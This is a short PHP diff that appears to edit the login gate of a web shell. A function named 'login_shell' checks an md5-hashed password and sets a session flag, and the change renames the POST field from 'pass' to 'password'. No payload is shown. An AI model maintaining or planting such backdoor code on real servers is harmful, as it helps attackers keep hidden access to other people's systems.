@@ -13,7 +13,7 @@ function login_shell() {
     exit;
 }
 if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
-    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
+    if (isset($_POST['password']) && (md5($_POST['password']) == $password)) {
         $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
     } else {
         login_shell();
